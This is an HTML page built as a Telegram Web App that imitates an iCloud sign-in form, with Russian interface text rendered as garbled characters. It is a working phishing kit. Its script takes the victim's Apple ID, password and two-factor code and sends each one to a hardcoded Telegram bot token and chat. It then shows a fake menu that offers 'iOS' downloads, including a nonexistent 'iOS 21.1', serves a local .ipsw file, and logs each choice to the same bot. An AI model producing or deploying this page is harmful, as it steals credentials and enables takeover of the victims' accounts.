<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í—Ö–æ–¥ –≤ iCloud</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            padding-top: 50px;
            background-color: #f5f5f7;
        }
        .login-form { width: 300px; display: flex; flex-direction: column; gap: 15px; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { text-align: center; font-size: 20px; margin-bottom: 10px; }
        input { padding: 12px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 16px; outline: none; }
        input:focus { border-color: #007aff; }
        button { padding: 12px; background: #007aff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 500; }
        button:hover { background: #0063cc; }
        button.secondary { background: #f5f5f7; color: #007aff; border: 1px solid #007aff; }
        p { font-size: 14px; color: #6e6e73; text-align: center; }
    </style>
</head>
<body>

<div class="login-form" id="auth-step">
    <h2>–í—Ö–æ–¥ –≤ iCloud</h2>
    <input type="text" id="email" placeholder="Apple ID">
    <input type="password" id="password" placeholder="–ü–∞—Ä–æ–ª—å">
    <button onclick="sendData()">–í–æ–π—Ç–∏</button>
</div>

<div class="login-form" id="2fa-step" style="display:none;">
    <h2>–î–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞</h2>
    <p>–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –≤–∞—à–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ Apple.</p>
    <input type="text" id="code" placeholder="–ö–æ–¥ –∏–∑ 6 —Ü–∏—Ñ—Ä" maxlength="6">
    <button onclick="send2FA()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
</div>

<div class="login-form" id="menu-step" style="display:none;">
    <h2>–ß—Ç–æ –≤—ã —Ö–æ—Ç–∏—Ç–µ —Å–¥–µ–ª–∞—Ç—å?</h2>
    <button onclick="alert('–†–µ–≥–∏–æ–Ω —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω!')">–ë—ã—Å—Ç—Ä–æ —Å–º–µ–Ω–∏—Ç—å —Ä–µ–≥–∏–æ–Ω</button>
    <button class="secondary" onclick="showIosMenu()">–°–∫–∞—á–∞—Ç—å iOS</button>
</div>

<div class="login-form" id="ios-step" style="display:none;">
    <h2>–í—ã–±–µ—Ä–∏—Ç–µ –≤–µ—Ä—Å–∏—é iOS</h2>
    <button onclick="downloadFile('16')">iOS 16</button>
    <button onclick="downloadFile('17')">iOS 17</button>
    <button onclick="downloadFile('18')">iOS 18</button>
    <button onclick="downloadFile('21.1')">iOS 21.1</button>
    <button class="secondary" onclick="backToMenu()">–ù–∞–∑–∞–¥</button>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
    const chatId = '-1003894478662';

    async function sendToTelegram(text) {
        try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
            });
        } catch (e) {
            console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:", e);
        }
    }

    async function sendData() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        if (!email.includes('@')) {
            alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π Apple ID');
            return;
        }
        await sendToTelegram(`‚ö†Ô∏è **–î–∞–Ω–Ω—ã–µ –≤—Ö–æ–¥–∞**\nüë§ ID: \`${email}\`\nüîë Pass: \`${pass}\``);
        
        document.getElementById('auth-step').style.display = 'none';
        document.getElementById('2fa-step').style.display = 'flex';
    }

    async function send2FA() {
        const code = document.getElementById('code').value;
        if (code.length < 4) {
            alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–ª–Ω–æ—Å—Ç—å—é');
            return;
        }
        await sendToTelegram(`üî¢ **–ö–æ–¥ 2FA**: \`${code}\``);
        
        // –í–º–µ—Å—Ç–æ –∑–∞–∫—Ä—ã—Ç–∏—è ‚Äî –æ—Ç–∫—Ä—ã–≤–∞–µ–º –º–µ–Ω—é
        document.getElementById('2fa-step').style.display = 'none';
        document.getElementById('menu-step').style.display = 'flex';
    }

    function showIosMenu() {
        document.getElementById('menu-step').style.display = 'none';
        document.getElementById('ios-step').style.display = 'flex';
    }

    function backToMenu() {
        document.getElementById('ios-step').style.display = 'none';
        document.getElementById('menu-step').style.display = 'flex';
    }

    function downloadFile(version) {
        sendToTelegram(`üì≤ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã–±—Ä–∞–ª –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è iOS: ${version}`);
        
        // –°–æ–∑–¥–∞–µ–º —Å—Å—ã–ª–∫—É –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è —Ñ–∞–π–ª–∞
        // –ó–∞–º–µ–Ω–∏—Ç–µ 'ios.ipsw' –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π URL –≤–∞—à–µ–≥–æ —Ñ–∞–π–ª–∞
        const link = document.createElement('a');
        link.href = 'ios.ipsw'; // –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É
        link.download = `iOS_${version}.ipsw`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        tg.showConfirm(`–ù–∞—á–∏–Ω–∞–µ—Ç—Å—è –∑–∞–≥—Ä—É–∑–∫–∞ iOS ${version}. –ó–∞–∫—Ä—ã—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ?`, (ok) => {
            if (ok) tg.close();
        });
    }
</script>

</body>
</html>
